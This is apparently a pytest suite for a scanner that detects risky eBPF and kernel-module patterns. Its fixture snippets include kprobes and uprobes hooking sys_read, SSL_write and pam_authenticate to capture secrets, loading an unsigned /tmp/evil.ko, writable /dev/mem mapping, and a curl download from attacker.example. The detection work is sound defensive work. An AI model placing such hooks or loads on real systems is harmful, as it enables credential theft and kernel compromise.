"""Tests for scripts/lib/ebpf_kernel_patterns.py.

Pattern-coverage tests for the Wave-19 distillation round 5 angle J
catalogue (BPF_PROG_LOAD, kprobe targets, register_kprobe on syscall
table, bpf_override_return, uprobe on libssl/PAM, pinned-map mode,
unsigned .ko load, module signing key leak, kallsyms posture,
/dev/mem mapping, firmware_class.path hijack, LSM stack passive,
bpftool in prod, container CAP_NET_RAW + unconfined, BTF blob from
untrusted source).

Each rule gets at least one positive test + at least one negative test
exercising the carve-out / safe shape. ~50 tests total.
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import ebpf_kernel_patterns as ekp  # type: ignore[import-not-found]  # noqa: E402

# ---------- Synthetic secret-shaped fixtures -----------------------------
# PEM markers are split so no contiguous BEGIN/END PRIVATE KEY token exists
# at rest in this file. Runtime values are byte-identical to a real PEM.
_PEM_BEGIN_PK = "-----BEGIN " + "PRIVATE KEY-----"
_PEM_END_PK = "-----END " + "PRIVATE KEY-----"
_PEM_BEGIN_RSA = "-----BEGIN RSA " + "PRIVATE KEY-----"
_PEM_END_RSA = "-----END RSA " + "PRIVATE KEY-----"

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_frozen_ordered() -> None:
    """RULES must be a tuple and contain every advertised rule id."""
    assert isinstance(ekp.RULES, tuple)
    rule_ids = {r.id for r in ekp.RULES}
    expected = {
        "ebpf-prog-load-uncapped",
        "ebpf-kprobe-on-secret-syscall",
        "kmod-kprobe-on-syscall-table",
        "ebpf-override-return",
        "ebpf-uprobe-on-libc-secret-fn",
        "ebpf-map-pin-world-readable",
        "kmod-unsigned-out-of-tree",
        "kmod-signing-key-exposed",
        "kernel-kallsyms-leaked",
        "kernel-devmem-open",
        "kernel-firmware-class-path-hijack",
        "kernel-lsm-stack-passive",
        "ebpf-bpftool-in-prod",
        "ebpf-container-net-raw-bpf",
        "ebpf-btf-from-untrusted-source",
    }
    assert expected.issubset(rule_ids)
    assert len(expected) == 15


def test_every_rule_has_owasp_and_severity() -> None:
    """Every rule maps to an ASI- prefix and valid severity."""
    for rule in ekp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding mirrors the sandbox_escape_patterns.Finding shape."""
    f = ekp.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-07",
    )
    assert f.rule_id == "r"
    assert f.line == 1 and f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "HIGH"
    assert f.description == "d"
    assert f.owasp_asi == "ASI-07"


def _hits(rule_id: str, text: str, *, file_kind: str = "auto",
         file_path: str = "") -> list[ekp.Finding]:
    return [f for f in ekp.scan_text(text, file_kind=file_kind, file_path=file_path)
            if f.rule_id == rule_id]


# ---------- Rule 1: BPF_PROG_LOAD without cap check ----------------------


def test_bpf_prog_load_without_cap_check_fires() -> None:
    """`syscall(SYS_bpf, BPF_PROG_LOAD, ...)` without cap-check fires."""
    src = (
        "#include <linux/bpf.h>\n"
        "int main(void) {\n"
        "    int fd = syscall(SYS_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));\n"
        "    return fd < 0 ? 1 : 0;\n"
        "}\n"
    )
    assert _hits("ebpf-prog-load-uncapped", src, file_kind="bpf_c")


def test_bpf_prog_load_with_cap_get_proc_suppressed() -> None:
    """`cap_get_proc()` in the same function suppresses the rule."""
    src = (
        "#include <sys/capability.h>\n"
        "int load_prog(void) {\n"
        "    cap_t caps = cap_get_proc();\n"
        "    /* check CAP_BPF in caps */\n"
        "    int fd = syscall(SYS_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));\n"
        "    return fd;\n"
        "}\n"
    )
    assert not _hits("ebpf-prog-load-uncapped", src, file_kind="bpf_c")


def test_bpf_prog_load_in_tests_dir_suppressed() -> None:
    """File path under `tests/` suppresses the rule."""
    src = "int main(void) { syscall(SYS_bpf, BPF_PROG_LOAD, &a, sizeof(a)); }\n"
    assert not _hits("ebpf-prog-load-uncapped", src,
                    file_kind="bpf_c",
                    file_path="tools/testing/selftests/bpf/test_x.c")


def test_bpf_prog_load_with_inline_comment_marker_suppressed() -> None:
    """Same-function `// CAP_BPF: caller-checked` comment suppresses."""
    src = (
        "int load_prog(void) {\n"
        "    // CAP_BPF: caller-checked\n"
        "    return syscall(SYS_bpf, BPF_PROG_LOAD, &a, sizeof(a));\n"
        "}\n"
    )
    assert not _hits("ebpf-prog-load-uncapped", src, file_kind="bpf_c")


# ---------- Rule 2: kprobe on secret syscall -----------------------------


def test_kprobe_sec_on_sys_read_fires() -> None:
    """`SEC("kprobe/__x64_sys_read")` is a credential-stealing kprobe."""
    src = (
        '#include "bpf/bpf_helpers.h"\n'
        'SEC("kprobe/__x64_sys_read")\n'
        "int BPF_KPROBE(grab_read, int fd, void *buf, size_t cnt) {\n"
        "    return 0;\n"
        "}\n"
        'char LICENSE[] SEC("license") = "GPL";\n'
    )
    assert _hits("ebpf-kprobe-on-secret-syscall", src, file_kind="bpf_c")


def test_kprobe_on_tcp_sendmsg_fires() -> None:
    """`SEC("kprobe/tcp_sendmsg")` captures TLS plaintext."""
    src = (
        'SEC("kprobe/tcp_sendmsg")\n'
        "int probe_sendmsg(struct pt_regs *ctx) { return 0; }\n"
    )
    assert _hits("ebpf-kprobe-on-secret-syscall", src, file_kind="bpf_c")


def test_kprobe_libbpf_set_attach_target_fires() -> None:
    """libbpf-style `bpf_program__set_attach_target(... "vfs_read")` fires."""
    src = (
        "bpf_program__set_attach_target(prog, 0, \"vfs_read\");\n"
    )
    assert _hits("ebpf-kprobe-on-secret-syscall", src, file_kind="bpf_c")


def test_kprobe_on_getpid_does_not_fire() -> None:
    """`SEC("kprobe/__x64_sys_getpid")` is benign — should NOT fire."""
    src = (
        'SEC("kprobe/__x64_sys_getpid")\n'
        "int probe_getpid(struct pt_regs *ctx) { return 0; }\n"
    )
    assert not _hits("ebpf-kprobe-on-secret-syscall", src, file_kind="bpf_c")


# ---------- Rule 3: register_kprobe on syscall table ---------------------


def test_register_kprobe_on_sys_call_table_fires() -> None:
    """Kernel module with `.symbol_name = "sys_call_table"` fires."""
    src = (
        "#include <linux/kprobes.h>\n"
        "#include <linux/module.h>\n"
        "static struct kprobe kp = {\n"
        '    .symbol_name = "sys_call_table",\n'
        "};\n"
        "static int __init init_mod(void) {\n"
        "    return register_kprobe(&kp);\n"
        "}\n"
    )
    assert _hits("kmod-kprobe-on-syscall-table", src, file_kind="c_source")


def test_register_kprobe_on_x64_sys_openat_fires() -> None:
    """`.symbol_name = "__x64_sys_openat"` fires (per-syscall hook)."""
    src = (
        "static struct kprobe kp = {\n"
        '    .symbol_name = "__x64_sys_openat",\n'
        "};\n"
    )
    assert _hits("kmod-kprobe-on-syscall-table", src, file_kind="c_source")


def test_register_kprobe_on_neutral_symbol_does_not_fire() -> None:
    """Neutral kernel symbol like `do_filp_open` does NOT fire."""
    src = (
        "static struct kprobe kp = {\n"
        '    .symbol_name = "do_filp_open",\n'
        "};\n"
    )
    assert not _hits("kmod-kprobe-on-syscall-table", src, file_kind="c_source")


# ---------- Rule 4: bpf_override_return ----------------------------------


def test_bpf_override_return_call_fires() -> None:
    """Any call to `bpf_override_return(...)` outside tests fires."""
    src = (
        '#include "bpf/bpf_helpers.h"\n'
        'SEC("kprobe/__x64_sys_openat")\n'
        "int rewrite_openat(struct pt_regs *ctx) {\n"
        "    bpf_override_return(ctx, -1);\n"
        "    return 0;\n"
        "}\n"
    )
    assert _hits("ebpf-override-return", src, file_kind="bpf_c")


def test_bpf_override_return_in_selftests_suppressed() -> None:
    """File under `tools/testing/selftests/bpf/` suppresses."""
    src = "bpf_override_return(ctx, -1);\n"
    assert not _hits("ebpf-override-return", src,
                    file_kind="bpf_c",
                    file_path="tools/testing/selftests/bpf/test_override.c")


# ---------- Rule 5: uprobe on libssl / PAM / libc secrets ----------------


def test_uprobe_on_ssl_write_fires() -> None:
    """`SEC("uprobe//usr/lib/libssl.so/SSL_write")` fires (TLS plaintext)."""
    src = (
        'SEC("uprobe//usr/lib/libssl.so.3/SSL_write")\n'
        "int probe_ssl_write(struct pt_regs *ctx) { return 0; }\n"
    )
    assert _hits("ebpf-uprobe-on-libc-secret-fn", src, file_kind="bpf_c")


def test_uprobe_on_pam_authenticate_fires() -> None:
    """`uprobe pam_authenticate` is a password capture primitive."""
    src = (
        'SEC("uprobe//usr/lib/libpam.so.0/pam_authenticate")\n'
        "int probe_pam(struct pt_regs *ctx) { return 0; }\n"
    )
    assert _hits("ebpf-uprobe-on-libc-secret-fn", src, file_kind="bpf_c")


def test_uprobe_libbpf_attach_uprobe_opts_fires() -> None:
    """libbpf `bpf_program__attach_uprobe_opts(..., "SSL_read", ...)` fires."""
    src = (
        'bpf_program__attach_uprobe_opts(prog, -1, "/usr/lib/libssl.so",\n'
        '                                "SSL_read", &opts);\n'
    )
    assert _hits("ebpf-uprobe-on-libc-secret-fn", src, file_kind="bpf_c")


def test_uprobe_on_malloc_does_not_fire() -> None:
    """Uprobe on `malloc` is a benign tracing primitive — no fire."""
    src = (
        'SEC("uprobe//usr/lib/libc.so.6/malloc")\n'
        "int probe_malloc(struct pt_regs *ctx) { return 0; }\n"
    )
    assert not _hits("ebpf-uprobe-on-libc-secret-fn", src, file_kind="bpf_c")


# ---------- Rule 6: pinned eBPF map without restrictive chmod ------------


def test_bpf_obj_pin_without_chmod_fires() -> None:
    """Pin call with no follow-up chmod 0600 → fire."""
    src = (
        'int err = bpf_obj_pin(map_fd, "/sys/fs/bpf/secrets_map");\n'
        '/* no chmod follow-up */\n'
    )
    assert _hits("ebpf-map-pin-world-readable", src, file_kind="bpf_c")


def test_bpf_obj_pin_with_chmod_0600_suppressed() -> None:
    """Pin call followed by `chmod 0600` on same path → suppressed."""
    src = (
        'int err = bpf_obj_pin(map_fd, "/sys/fs/bpf/secrets_map");\n'
        'chmod("/sys/fs/bpf/secrets_map", 0600);\n'
    )
    assert not _hits("ebpf-map-pin-world-readable", src, file_kind="bpf_c")


def test_bpf_obj_pin_world_readable_chmod_fires() -> None:
    """Pin call followed by `chmod 0644` → fire."""
    src = (
        'int err = bpf_obj_pin(map_fd, "/sys/fs/bpf/secrets_map");\n'
        'chmod("/sys/fs/bpf/secrets_map", 0644);\n'
    )
    assert _hits("ebpf-map-pin-world-readable", src, file_kind="bpf_c")


def test_bpf_obj_pin_under_tc_subsystem_suppressed() -> None:
    """tc subsystem pin paths are root-only by convention → suppressed."""
    src = 'bpf_obj_pin(map_fd, "/sys/fs/bpf/tc/globals/cls_map");\n'
    assert not _hits("ebpf-map-pin-world-readable", src, file_kind="bpf_c")


# ---------- Rule 7: unsigned out-of-tree .ko load ------------------------


def test_insmod_out_of_tree_with_sig_enforce_off_fires() -> None:
    """`insmod /tmp/evil.ko` + `module.sig_enforce=0` → fire."""
    src = (
        "#!/bin/sh\n"
        "echo 'kernel cmdline contains module.sig_enforce=0'\n"
        "insmod /tmp/evil.ko\n"
    )
    assert _hits("kmod-unsigned-out-of-tree", src, file_kind="shell")


def test_insmod_distro_managed_path_suppressed() -> None:
    """`insmod /lib/modules/$(uname -r)/kernel/foo.ko` → suppressed."""
    src = (
        "#!/bin/sh\n"
        "insmod /lib/modules/5.15.0/kernel/drivers/net/foo.ko\n"
    )
    assert not _hits("kmod-unsigned-out-of-tree", src, file_kind="shell")


def test_insmod_tmp_writable_path_fires_without_sig_off() -> None:
    """`insmod /tmp/foo.ko` fires even without explicit sig_enforce=0."""
    src = "#!/bin/sh\ninsmod /tmp/foo.ko\n"
    assert _hits("kmod-unsigned-out-of-tree", src, file_kind="shell")


# ---------- Rule 8: module signing key exposed ---------------------------


def test_signing_key_filename_with_private_key_body_fires() -> None:
    """File named `signing_key.pem` containing a PRIVATE KEY block → fire."""
    src = (
        f"{_PEM_BEGIN_PK}\n"
        "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQ==\n"
        f"{_PEM_END_PK}\n"
    )
    assert _hits("kmod-signing-key-exposed", src,
                file_kind="pem",
                file_path="certs/signing_key.pem")


def test_signing_key_encrypted_body_suppressed() -> None:
    """Encrypted private key (DEK-Info / ENCRYPTED) → suppressed."""
    src = (
        f"{_PEM_BEGIN_RSA}\n"
        "Proc-Type: 4,ENCRYPTED\n"
        "DEK-Info: AES-256-CBC,abc123\n"
        "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQ==\n"
        f"{_PEM_END_RSA}\n"
    )
    assert not _hits("kmod-signing-key-exposed", src,
                    file_kind="pem",
                    file_path="certs/signing_key.pem")


def test_signing_key_body_with_module_signing_cert_fires() -> None:
    """Body containing both private-key block AND 'Module Signing' cert."""
    src = (
        f"{_PEM_BEGIN_PK}\n"
        "MIIEvQ...\n"
        f"{_PEM_END_PK}\n"
        "-----BEGIN CERTIFICATE-----\n"
        "Build time autogenerated kernel Module Signing key cert\n"
        "MIIDAj...\n"
        "-----END CERTIFICATE-----\n"
    )
    assert _hits("kmod-signing-key-exposed", src, file_kind="pem")


def test_random_private_key_without_signing_context_suppressed() -> None:
    """Random PRIVATE KEY without signing-key filename/cert → no fire."""
    src = (
        f"{_PEM_BEGIN_PK}\n"
        "MIIEvQ...\n"
        f"{_PEM_END_PK}\n"
    )
    assert not _hits("kmod-signing-key-exposed", src, file_kind="pem",
                    file_path="ssl/server.pem")


# ---------- Rule 9: kallsyms leak via kptr_restrict ----------------------


def test_kptr_restrict_zero_fires() -> None:
    """`kernel.kptr_restrict = 0` is the most permissive setting → fire."""
    src = "kernel.kptr_restrict = 0\n"
    assert _hits("kernel-kallsyms-leaked", src, file_kind="sysctl")


def test_kptr_restrict_one_fires() -> None:
    """`kernel.kptr_restrict = 1` still leaks to CAP_SYSLOG → fire."""
    src = "kernel.kptr_restrict = 1\n"
    assert _hits("kernel-kallsyms-leaked", src, file_kind="sysctl")


def test_kptr_restrict_two_suppressed() -> None:
    """`kernel.kptr_restrict = 2` is the hardened value → no fire."""
    src = "kernel.kptr_restrict = 2\n"
    assert not _hits("kernel-kallsyms-leaked", src, file_kind="sysctl")


def test_kptr_restrict_with_kspp_exempt_marker_suppressed() -> None:
    """Same-line `# kspp-exempt` marker explicitly opts out."""
    src = "kernel.kptr_restrict = 0  # kspp-exempt\n"
    assert not _hits("kernel-kallsyms-leaked", src, file_kind="sysctl")


def test_perf_event_paranoid_zero_fires() -> None:
    """`kernel.perf_event_paranoid = 0` leaks via perf events → fire."""
    src = "kernel.perf_event_paranoid = 0\n"
    assert _hits("kernel-kallsyms-leaked", src, file_kind="sysctl")


# ---------- Rule 10: /dev/mem opened OR STRICT_DEVMEM disabled ----------


def test_strict_devmem_off_in_kconfig_fires() -> None:
    """`# CONFIG_STRICT_DEVMEM is not set` → fire."""
    src = "# CONFIG_STRICT_DEVMEM is not set\n"
    assert _hits("kernel-devmem-open", src, file_kind="kconfig")


def test_strict_devmem_equals_n_fires() -> None:
    """`CONFIG_STRICT_DEVMEM=n` → fire."""
    src = "CONFIG_STRICT_DEVMEM=n\n"
    assert _hits("kernel-devmem-open", src, file_kind="kconfig")


def test_strict_devmem_y_suppressed() -> None:
    """`CONFIG_STRICT_DEVMEM=y` is the hardened value → no fire."""
    src = "CONFIG_STRICT_DEVMEM=y\n"
    assert not _hits("kernel-devmem-open", src, file_kind="kconfig")


def test_devmem_open_with_mmap_prot_write_fires() -> None:
    """`open("/dev/mem", ...)` + `mmap(... PROT_WRITE ...)` → fire."""
    src = (
        "int fd = open(\"/dev/mem\", O_RDWR);\n"
        "void *p = mmap(NULL, 4096, PROT_READ|PROT_WRITE,\n"
        "               MAP_SHARED, fd, 0xfee00000);\n"
    )
    assert _hits("kernel-devmem-open", src, file_kind="c_source")


def test_devmem_open_without_mmap_prot_write_suppressed() -> None:
    """Read-only `open("/dev/mem")` without write mmap → no fire."""
    src = (
        "int fd = open(\"/dev/mem\", O_RDONLY);\n"
        "/* read-only access only */\n"
    )
    assert not _hits("kernel-devmem-open", src, file_kind="c_source")


# ---------- Rule 11: firmware_class.path hijack -------------------------


def test_firmware_class_path_tmp_fires() -> None:
    """`firmware_class.path=/tmp/firmware` → fire."""
    src = "GRUB_CMDLINE_LINUX=\"firmware_class.path=/tmp/firmware quiet\"\n"
    assert _hits("kernel-firmware-class-path-hijack", src, file_kind="cmdline")


def test_firmware_class_path_dev_shm_fires() -> None:
    """`firmware_class.path=/dev/shm/...` → fire."""
    src = "menuentry { linux /boot/vmlinuz firmware_class.path=/dev/shm/x }\n"
    assert _hits("kernel-firmware-class-path-hijack", src, file_kind="cmdline")


def test_firmware_class_path_lib_firmware_suppressed() -> None:
    """`firmware_class.path=/lib/firmware` (vendor default) → no fire."""
    src = "GRUB_CMDLINE_LINUX=\"firmware_class.path=/lib/firmware\"\n"
    assert not _hits("kernel-firmware-class-path-hijack", src, file_kind="cmdline")


def test_firmware_class_path_run_user_fires() -> None:
    """`firmware_class.path=/run/user/1000/fw` → fire (user-writable)."""
    src = "kernel /boot/vmlinuz firmware_class.path=/run/user/1000/fw\n"
    assert _hits("kernel-firmware-class-path-hijack", src, file_kind="cmdline")


# ---------- Rule 12: LSM stack passive ----------------------------------


def test_lsm_stack_with_selinux_permissive_fires() -> None:
    """`lsm=apparmor,selinux` with `SELINUX=permissive` → fire."""
    src = (
        "GRUB_CMDLINE_LINUX=\"lsm=apparmor,selinux\"\n"
        "SELINUX=permissive\n"
    )
    assert _hits("kernel-lsm-stack-passive", src, file_kind="cmdline")


def test_lsm_single_enforce_zero_with_selinux_context_fires() -> None:
    """`selinux=0` in a file mentioning SELinux → fire."""
    src = "SELINUX=disabled\n# Disabled for debugging\n"
    assert _hits("kernel-lsm-stack-passive", src, file_kind="sysctl")


def test_lsm_no_passive_marker_suppressed() -> None:
    """`lsm=apparmor,selinux` without permissive marker → no fire."""
    src = "GRUB_CMDLINE_LINUX=\"lsm=apparmor,selinux\"\n"
    assert not _hits("kernel-lsm-stack-passive", src, file_kind="cmdline")


# ---------- Rule 13: bpftool in prod ------------------------------------


def test_bpftool_apt_install_fires() -> None:
    """`apt-get install bpftool` in Dockerfile → fire."""
    src = (
        "FROM ubuntu:22.04\n"
        "RUN apt-get update && apt-get install -y bpftool curl\n"
    )
    assert _hits("ebpf-bpftool-in-prod", src, file_kind="shell")


def test_bpftool_linux_tools_install_fires() -> None:
    """`apt install linux-tools-generic` → fire (ships bpftool)."""
    src = "RUN apt-get install -y linux-tools-generic\n"
    assert _hits("ebpf-bpftool-in-prod", src, file_kind="shell")


def test_bpftool_binary_path_in_dockerfile_fires() -> None:
    """Reference to `/usr/sbin/bpftool` in CMD/ENTRYPOINT → fire."""
    src = "CMD [\"/usr/sbin/bpftool\", \"prog\", \"show\"]\n"
    assert _hits("ebpf-bpftool-in-prod", src, file_kind="shell")


def test_bpftool_unrelated_package_suppressed() -> None:
    """`apt-get install curl` (no bpftool) → no fire."""
    src = "RUN apt-get install -y curl wget\n"
    assert not _hits("ebpf-bpftool-in-prod", src, file_kind="shell")


# ---------- Rule 14: container CAP_NET_RAW + seccomp Unconfined ---------


def test_k8s_pod_cap_net_raw_with_unconfined_fires() -> None:
    """Pod with CAP_NET_RAW + seccompProfile.type: Unconfined → fire."""
    src = (
        "apiVersion: v1\n"
        "kind: Pod\n"
        "metadata:\n"
        "  name: sniff-pod\n"
        "spec:\n"
        "  containers:\n"
        "  - name: app\n"
        "    image: alpine\n"
        "    securityContext:\n"
        "      capabilities:\n"
        "        add: [\"NET_RAW\"]\n"
        "      seccompProfile:\n"
        "        type: Unconfined\n"
    )
    assert _hits("ebpf-container-net-raw-bpf", src, file_kind="k8s")


def test_k8s_pod_cap_bpf_missing_seccomp_fires() -> None:
    """Pod with CAP_BPF and no seccompProfile (defaults Unconfined) → fire."""
    src = (
        "apiVersion: v1\n"
        "kind: Pod\n"
        "metadata:\n"
        "  name: bpf-pod\n"
        "spec:\n"
        "  containers:\n"
        "  - name: app\n"
        "    image: alpine\n"
        "    securityContext:\n"
        "      capabilities:\n"
        "        add: [\"BPF\"]\n"
    )
    assert _hits("ebpf-container-net-raw-bpf", src, file_kind="k8s")


def test_k8s_pod_cap_net_raw_with_runtime_default_suppressed() -> None:
    """Pod with NET_RAW but seccomp RuntimeDefault → no fire."""
    src = (
        "apiVersion: v1\n"
        "kind: Pod\n"
        "metadata:\n"
        "  name: ok-pod\n"
        "spec:\n"
        "  containers:\n"
        "  - name: app\n"
        "    image: alpine\n"
        "    securityContext:\n"
        "      capabilities:\n"
        "        add: [\"NET_RAW\"]\n"
        "      seccompProfile:\n"
        "        type: RuntimeDefault\n"
    )
    assert not _hits("ebpf-container-net-raw-bpf", src, file_kind="k8s")


def test_k8s_pod_no_dangerous_cap_suppressed() -> None:
    """Pod without NET_RAW / NET_ADMIN / BPF → no fire."""
    src = (
        "apiVersion: v1\n"
        "kind: Pod\n"
        "metadata:\n"
        "  name: plain\n"
        "spec:\n"
        "  containers:\n"
        "  - name: app\n"
        "    image: alpine\n"
        "    securityContext:\n"
        "      capabilities:\n"
        "        add: [\"SYS_TIME\"]\n"
        "      seccompProfile:\n"
        "        type: Unconfined\n"
    )
    assert not _hits("ebpf-container-net-raw-bpf", src, file_kind="k8s")


# ---------- Rule 15: BTF blob from untrusted source ---------------------


def test_btf_fetch_from_random_github_fires() -> None:
    """`curl https://attacker.example/vmlinux.btf` → fire."""
    src = (
        "#!/bin/sh\n"
        "curl -sL https://attacker.example/vmlinux.btf -o /tmp/vmlinux.btf\n"
    )
    assert _hits("ebpf-btf-from-untrusted-source", src, file_kind="shell")


def test_btf_fetch_from_btfhub_suppressed() -> None:
    """Fetch from `btfhub.com` (trusted mirror) → no fire."""
    src = (
        "#!/bin/sh\n"
        "curl -sL https://btfhub.com/x86_64/vmlinux-5.15.btf.tar.xz -o /tmp/btf.tar.xz\n"
    )
    assert not _hits("ebpf-btf-from-untrusted-source", src, file_kind="shell")


def test_btf_fetch_with_sha256_pin_suppressed() -> None:
    """Fetch followed by `sha256sum -c` within window → no fire."""
    src = (
        "#!/bin/sh\n"
        "curl -sL https://random.example/vmlinux.btf -o /tmp/vmlinux.btf\n"
        "echo 'abc123...  /tmp/vmlinux.btf' | sha256sum -c -\n"
    )
    assert not _hits("ebpf-btf-from-untrusted-source", src, file_kind="shell")


def test_btf_fetch_via_wget_fires() -> None:
    """`wget https://untrusted.example/btf/...tar.gz` → fire."""
    src = (
        "wget https://untrusted.example/btf/vmlinux.btf.tar.gz -O btf.tar.gz\n"
    )
    assert _hits("ebpf-btf-from-untrusted-source", src, file_kind="shell")


# ---------- Cross-cutting tests -----------------------------------------


def test_scan_empty_text_returns_empty() -> None:
    """Empty input → empty findings."""
    assert ekp.scan_text("") == []
    assert ekp.scan_text("", file_kind="bpf_c") == []


def test_findings_sorted_by_line_column_rule() -> None:
    """Multiple findings come out sorted by (line, column, rule_id)."""
    src = (
        "kernel.kptr_restrict = 0\n"
        "kernel.perf_event_paranoid = 0\n"
    )
    findings = ekp.scan_text(src, file_kind="sysctl")
    lines = [f.line for f in findings]
    assert lines == sorted(lines)


def test_findings_deduped_on_rule_line_col_match() -> None:
    """Identical (rule_id, line, column, matched_text) entries are deduped."""
    # Two identical lines that each produce one finding — different
    # positions so two findings expected, NOT one.
    src = (
        "kernel.kptr_restrict = 0\n"
        "kernel.kptr_restrict = 0\n"
    )
    findings = _hits("kernel-kallsyms-leaked", src, file_kind="sysctl")
    assert len(findings) == 2


def test_auto_kind_detection_for_bpf_c() -> None:
    """A file with `SEC()` annotations is sniffed as bpf_c."""
    src = (
        '#include <bpf/bpf_helpers.h>\n'
        'SEC("kprobe/__x64_sys_read")\n'
        "int probe(struct pt_regs *ctx) { return 0; }\n"
    )
    findings = ekp.scan_text(src)  # auto
    assert any(f.rule_id == "ebpf-kprobe-on-secret-syscall" for f in findings)


def test_auto_kind_detection_for_sysctl() -> None:
    """A file with `kernel.kptr_restrict` is sniffed as sysctl."""
    src = "kernel.kptr_restrict = 0\n"
    findings = ekp.scan_text(src)  # auto
    assert any(f.rule_id == "kernel-kallsyms-leaked" for f in findings)


def test_auto_kind_detection_for_pem() -> None:
    """A PEM-headered file is sniffed as pem."""
    src = (
        f"{_PEM_BEGIN_PK}\n"
        "MIIEvQ...\n"
        f"{_PEM_END_PK}\n"
    )
    findings = ekp.scan_text(src, file_path="certs/signing_key.pem")
    assert any(f.rule_id == "kmod-signing-key-exposed" for f in findings)


def test_rule_count_matches_distill_proposals() -> None:
    """RULES has exactly 15 entries (one per distill proposal)."""
    assert len(ekp.RULES) == 15


def test_severity_distribution_matches_proposals() -> None:
    """Severity counts: 7 CRITICAL, 7 HIGH, 1 MEDIUM (per the distill report)."""
    sev_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for rule in ekp.RULES:
        sev_counts[rule.severity] += 1
    assert sev_counts["CRITICAL"] == 7
    assert sev_counts["HIGH"] == 7
    assert sev_counts["MEDIUM"] == 1
    assert sev_counts["LOW"] == 0
